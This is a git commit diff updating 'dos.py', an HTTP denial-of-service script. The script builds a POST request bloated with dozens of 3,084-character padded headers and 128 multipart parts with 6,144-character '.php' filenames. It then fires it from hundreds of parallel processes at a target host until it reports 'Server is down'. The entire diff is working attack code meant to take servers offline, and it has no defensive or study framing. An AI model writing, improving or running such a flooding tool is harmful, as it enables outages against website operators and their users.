9a4c6a672df0164f4e9c7442cd1be4b4ab46079e
Dead_moon <58658937+GloryToMoon@users.noreply.github.com>
2021-03-11 11:11:58 +0300

    Update dos.py

--- http-dos/dos.py
+++ http-dos/dos.py
@@ -1,58 +1,65 @@
 import argparse
 import socket
 import time
+import multiprocessing
 from multiprocessing import Process
+from socket import error as socket_error
 
 def gen_packet(host):
-	test = 'POST /index.php HTTP/1.1\r\n'
-	test += 'Host: ' + host + '\r\n'
-	test += 'User-Agent: Mozila/5.0\r\n'
-	test += 'Accept: */*\r\n'
-	test += 'Content-Type: multipart/form-data; boundary=---------------------------32917364219558108233580962733\r\n'
-	test += 'Connection: keep-alive\r\n'
-	test += 'Content-Length: 8122000\r\n'
-	test += 'Origin: http://' + 'A' * 3084 + '\r\n'
-	for i in range(1,93,1):
-		test += 'AdvancedHeaderName' + str(i) + ':' + 'A' *  3084 + '\r\n'
-	test += 'Referer: http://' + 'A' * 3084 + '\r\n\r\n'
-	for i in range(1,129,1):
-		test += '-----------------------------32917364219558108233580962733\r\n'
-		test += 'Content-Disposition: form-data; name="user_file_name' + str(i) + '"; filename="' + str(i) + 'A' * 6144 + '.php"\r\n'
-		test += 'Content-Type: application/x-php\r\n\r\n'
-	return test
+	packet = 'POST /index.php HTTP/1.1\r\n'
+	packet += 'Host: ' + host + '\r\n'
+	packet += 'User-Agent: Mozila/5.0\r\n'
+	packet += 'Accept: */*\r\n'
+	packet += 'Content-Type: multipart/form-data; boundary=---------------------------32917364219558108233580962733\r\n'
+	packet += 'Connection: keep-alive\r\n'
+	packet += 'Content-Length: 8122000\r\n'
+	packet += 'Origin: http://' + 'A' * 3084 + '\r\n'
+	for i in range(92):
+		packet += 'AdvancedHeaderName' + str(i) + ':' + 'A' *  3084 + '\r\n'
+	packet += 'Referer: http://' + 'A' * 3084 + '\r\n\r\n'
+	for i in range(128):
+		packet += '-----------------------------32917364219558108233580962733\r\n'
+		packet += 'Content-Disposition: form-data; name="user_file_name' + str(i) + '"; filename="' + str(i) + 'A' * 6144 + '.php"\r\n'
+		packet += 'Content-Type: application/x-php\r\n\r\n'
+	return packet
 
 def send_packet(host,packet,port):
 	try:
-		sock1 = socket.socket()
+		sock = socket.socket()
 		try:
-			sock1.connect((host, port))
-		except:
-			print ('[!] Connection time out')
+			sock.connect((host, port))
+		except socket_error:
+			return_dict[0]="refused"
 		else:
-			sock1.send(packet.encode())
+			sock.send(packet.encode())
 			try:
-				data1 = sock1.recv(1024).decode()
+				sock.recv(1024).decode()
 			except KeyboardInterrupt:
 				return 'killed'
-			except:
-				print ('[+] Server is down')
+			except socket_error:
+				return_dict[0]="down"
 	except KeyboardInterrupt:
-		return 'killed'
-
+		exit(0)
 if __name__ == '__main__':
 	parser = argparse.ArgumentParser()
 	parser.add_argument('host', action='store', type=str, help='RHOST to send "bad packets"')
 	parser.add_argument('-p', '--port', default="80", action='store', type=int, help='RPORT to send "bad packets"')
 	args = parser.parse_args()
 	packet=gen_packet(args.host)
+	return_dict = multiprocessing.Manager().dict()
 	while True:
 		try:
 			print ('[*] Sending bad http packet')
-			for i in range(1000):
+			for i in range(500):
 				proc = Process(target=send_packet, args=(args.host,packet,args.port,))
 				proc.start()
-			print ('[*] Timeout')
-			time.sleep(10)
-	        except KeyboardInterrupt:
+				if len(return_dict.values())==1 and return_dict.values()[0]=="refused":
+					print ('[!] Server refused request')
+					time.sleep(1)
+					exit(0)
+				elif len(return_dict.values())==1 and return_dict.values()[0]=="down":
+					print ('[+] Server is down')
+					time.sleep(600)
+		except KeyboardInterrupt:
 			print ('\nExit...')
 			exit(0)
